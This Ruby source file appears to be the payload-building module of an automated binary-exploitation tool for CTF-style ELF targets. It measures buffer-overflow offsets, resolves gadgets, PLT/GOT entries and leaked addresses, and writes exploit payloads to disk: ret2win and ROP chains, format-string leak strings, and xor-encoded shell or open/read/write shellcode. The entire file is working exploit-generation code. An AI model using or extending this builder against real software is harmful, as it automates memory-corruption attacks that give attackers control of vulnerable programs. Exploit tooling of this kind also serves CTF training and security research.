# frozen_string_literal: true

require "yaml"
require "augure"
# metasm (+ augure-profiler) loads lazily in build(): every lictor
# command would otherwise pay the 0.32 s load (H6)

module Lictor
  # The asploit inheritance: from the decision to the actual bytes.
  # The offset is MEASURED (static frame read first, the cyclic pattern
  # under the debugger as verifier/fallback), the return address comes
  # from facts with their provenance, and the assembly follows a BUILD
  # LAYOUT - data, not code: lictor ships layouts for its built-in
  # families (config/build_layouts.yml) and packs may add layouts for
  # their own techniques. The result is a payload file - like the
  # original's ./payload dump - trailed for the audit.
  module PayloadBuilder
    class BuildError < StandardError; end

    module_function

    # binary: the acquired local ELF copy. facts: text or Facts.
    # technique: the selected technique (drives the layout).
    # packs: loaded augure packs - a pack build: layout for the
    # technique WINS over the built-in file (packs teach, the builder
    # follows).
    # Returns {path:, offset:, offset_source:, sink:, ret:, ret_source:,
    # variant:, arch:, size:}.
    def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil, shellcode_path: nil)
      require "augure-profiler" # lazy: metasm loads on the first build only
      facts = Augure::Facts.parse(facts) if facts.is_a?(String)
      # The ELF check FIRST: nothing executes - statically or under the
      # debugger - until the file is a real ELF.
      binary = File.expand_path(binary)
      raise BuildError, "#{binary} is not an ELF - nothing executes, statically or under a debugger" unless elf?(binary)

      # the acquired copy comes through File.binwrite (0644): the offset
      # measurement runs it under the debugger, it must be executable
      FileUtils.chmod(0o755, binary) unless File.executable?(binary)
      begin
        static = AugureProfiler::StaticOffset.offset(binary)
      rescue
        static = nil
      end
      offset = static&.dig(:offset)
      offset_source = offset ? "static-frame" : nil
      layouts = layouts_for(technique, packs)
      # the measured offset serves the return-slot layouts only: the
      # fmtstr class addresses the stack through the format itself, the
      # fmt_offset fact carries the buffer's argument index - no return
      # slot to measure
      needs_offset = layouts.any? { |(_, layout)| layout.flatten.include?("measured_offset") }
      if needs_offset && !offset
        offset = AugureProfiler::Triage.offset(binary)
        offset_source = "gdb-cyclic" if offset
      end
      unless offset || !needs_offset
        raise BuildError,
          "no measured offset - static analysis found no controlled return and the debugger did not either"
      end
      arch = AugureProfiler.arch(binary)
      width = (arch == :x64) ? "Q<" : "L<"
      body = ret = ret_source = variant = nil
      failures = []
      layouts.each do |(name, layout)|
        body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
        variant = name
        break
      rescue BuildError => e
        failures << [name, e.message]
      end
      raise BuildError, match_failure(technique, failures) if body.nil?

      File.binwrite(out, body)
      {path: out, offset: offset, offset_source: offset_source, sink: static&.dig(:sink),
       ret: ret, ret_source: ret_source, variant: variant, arch: arch, size: body.bytesize}
    end

    # A technique may ship SEVERAL layouts: the mr5 callme form (PLT
    # helpers) and the static twin's form (announced-nothing stage
    # functions) are the same capability, and the facts decide which one
    # the binary supports. Each candidate carries its name for the trail.
    def layouts_for(technique, packs = [])
      built_in = YAML.load_file(File.expand_path("../config/build_layouts.yml", __dir__))
      entry = Array(packs).filter_map(&:build).find { |b| b["technique"] == technique } ||
        built_in[technique]
      raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml" unless entry

      variants = entry["variants"]
      return variants.map { |v| [v["name"], v["layout"]] } if variants

      [["default", entry["layout"]]]
    end

    # Every candidate failed: name each one with its own reason, never a
    # single opaque message (the operator teaches the missing layout).
    def match_failure(technique, failures)
      return "no build layout for #{technique} - teach one in the pack or in build_layouts.yml" if failures.empty?

      details = failures.map { |(name, why)| "#{name}: #{why}" }.join("; ")
      "no build variant of #{technique} matches the facts (#{details})"
    end

    # The layout slots, resolved against the facts and the measurement.
    # Every unresolved reference is a loud error: the builder never
    # guesses a byte.
    def assemble(facts, layout, offset, arch, width, payload_file, shellcode_path = nil)
      body = +""
      ret = nil
      ret_source = nil
      layout.each do |slot|
        case slot[0]
        when "fmtstr_leak"
          # the leak round: every stack qword from the buffer's own
          # index rides out as %K$p - the PIE base, the code pointers,
          # the saved frames. The window is fixed (40 slots): it
          # reaches the frame chain behind a 256-byte read buffer
          # (32 buffer qwords + saved rbp + return) while the format
          # itself still fits that read. The strike derives its
          # targets from what answers.
          n = facts["fmt_offset"]&.first&.first
          unless n
            raise BuildError,
              "fmtstr_leak: no fmt_offset fact - the profiler names the buffer's argument index off the frame"
          end

          n = Integer(n)
          body << ((n...(n + 40)).map { |k| "%#{k}$p" }.join(" ") + "|")
          # no return slot rides here: printf consumes the format - the
          # payload IS the return, the strike derives from what answers
          ret ||= body.dup
          ret_source ||= "fmt_offset:#{n}"
        when "padding"
          filler = (slot[2] == "sled") ? "\x90" : "A"
          body << (filler * offset).b
        when "qword", "dword", "word"
          # dword is 4 bytes WHATEVER the arch (a partial overwrite);
          # word is 2 bytes (the PIE page hop: the low 16 bits only);
          # qword is the arch's pointer width (8 on x64, 4 on x86)
          slot_width = {"dword" => "L<", "word" => "S<"}[slot[0]] || width
          value, source = resolve_addr(facts, slot[1], slot_width)
          ret ||= value
          ret_source ||= source
          body << [value].pack(slot_width)
        when "shellcode"
          sc = if payload_file
            File.binread(payload_file)
          else
            stub = (slot[1] || "sh").to_sym
            # the orw stub embeds its flag path: the builder-level
            # shellcode_path is the operator's explicit override and
            # wins over the slot's default (measured: the orw slot
            # carried flag.txt, the shared ret2func flag came back)
            path = shellcode_path || ((slot.size > 2) ? slot[2] : nil)
            # seccomp: execve dies, the sh stub is a booby trap - the
            # orw chain (open/read/write, clean exit) is the answer;
            # the flag path defaults to the CTF convention.
            if stub == :sh && facts["seccomp"]&.first&.first == "true"
              stub = :orw
              path ||= "flag.txt"
            end
            AugureProfiler::Shellcode.generate(shellcode_klass(arch), stub, path: path)
          end
          # The shellcode travels through a strcpy (the vuln=sof copy):
          # the copied string stops at the first NUL, so a raw stub dies
          # in the channel. The Encoder's xor wrapper (the decoder is
          # zero-free by construction, the data is xor-keyed) crosses it;
          # the decoded stub materializes in place at run time.
          sc = AugureProfiler::Encoder.encode(sc.b, badchars: [0x00], arch: arch)[:bytes]
          body << sc.b
        when "chain"
          # the strcpy family stops the copy at the first NUL: a chain
          # qword carrying a NUL byte truncates the copy BEFORE the rest
          # of the chain lands. The bounded channels (read/fgets/...)
          # copy the exact count - NULs ride whole. The sink fact names
          # the channel; without it the builder builds (the old shape).
          sink = facts["sink"]&.first&.first
          nul_channel = sink && AugureProfiler::StaticOffset::UNSAFE_CALLS.include?(sink)
          refs = slot[1..]
          refs.each_with_index do |ref, i|
            value, source = resolve_addr(facts, ref, width)
            ret ||= value
            ret_source ||= source
            body << [value].pack(width)
            next unless nul_channel

            bytes = [value].pack(width)
            if i < refs.size - 1
              # a middle qword must ride NUL-free: the copy stops at its
              # first NUL, the rest of the chain never lands
              if bytes.include?("\x00")
                raise BuildError,
                  "#{ref} = 0x#{value.to_s(16)} carries a NUL byte - the #{sink} channel " \
                  "stops the copy before the rest of the chain lands"
              end
            else
              # the last qword may ride partial: the stack keeps the high
              # bytes - its first NUL must be followed by zeros only
              first_nul = bytes.bytes.index(0)
              if first_nul && !bytes.bytes[first_nul..].all?(&:zero?)
                raise BuildError,
                  "#{ref} = 0x#{value.to_s(16)} carries a NUL byte before its trailing zeros - " \
                  "the #{sink} channel would land a partial overwrite of the wrong value"
              end
            end
          end
        else
          raise BuildError, "unknown build slot #{slot[0].inspect}"
        end
      end
      raise BuildError, "the layout produced no return address" if ret.nil?

      [body, ret, ret_source]
    end

    # slot ref -> (address, provenance). "win" = the win_symbol fact,
    # "gadget:TYPE" = the first gadget of that type (verified before use).
    def resolve_addr(facts, ref, _width)
      case ref
      when "win"
        win = facts["win_symbol"]&.first
        raise BuildError, "no win_symbol fact - the winning function's address is unknown" unless win

        [win[1], "win_symbol:#{win[0]}@#{win[1]}"]
      when /\Agadget:(.+?)(?:\+(\d+))?\z/
        type = Regexp.last_match(1)
        add = (Regexp.last_match(2) || 0).to_i
        gadget = facts["gadget"]&.find { |t, _| t == type }
        raise BuildError, "no #{type} gadget in the facts" unless gadget

        [gadget[1] + add, "gadget:#{type}#{"+#{add}" if add.positive?}@#{gadget[1]}"]
      when /\Aleak:(.+)\z/
        name = Regexp.last_match(1)
        leak = facts["leaked_address"]&.find { |n, _| n == name }
        raise BuildError, "no leaked_address(\"#{name}\") fact - harvest the service first" unless leak

        [leak[1], "leaked_address:#{name}@#{leak[1]}"]
      when /\Aplt_addr:(.+)\z/
        name = Regexp.last_match(1)
        entry = facts["plt_addr"]&.find { |n, _| n == name }
        raise BuildError, "no plt_addr(\"#{name}\") fact - profile the binary first" unless entry

        [entry[1], "plt_addr:#{name}@#{entry[1]}"]
      when /\Agot_addr:(.+)\z/
        name = Regexp.last_match(1)
        entry = facts["got_addr"]&.find { |n, _| n == name }
        raise BuildError, "no got_addr(\"#{name}\") fact - profile the binary first" unless entry

        [entry[1], "got_addr:#{name}@#{entry[1]}"]
      when /\Aconst:(\d+)\z/
        [Regexp.last_match(1).to_i, "const:#{Regexp.last_match(1)}"]
      when /\Asym:(.+?)(?:\+(\d+))?\z/
        name = Regexp.last_match(1)
        add = (Regexp.last_match(2) || 0).to_i
        entry = facts["sym_addr"]&.find { |n, _| n == name }
        unless entry
          raise BuildError,
            "no sym_addr(\"#{name}\") fact - the symbol is not in the binary's table, profile it first"
        end

        [entry[1] + add, "sym_addr:#{name}#{"+#{add}" if add.positive?}@#{entry[1]}"]
      else
        raise BuildError,
          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | sym:NAME | const:N)"
      end
    end

    def elf?(path)
      File.open(path, "rb") { |f| f.read(4) == "\x7fELF" }
    rescue
      false
    end

    def shellcode_klass(arch)
      (arch == :x64) ? Metasm::X64 : Metasm::Ia32
    end
  end
end
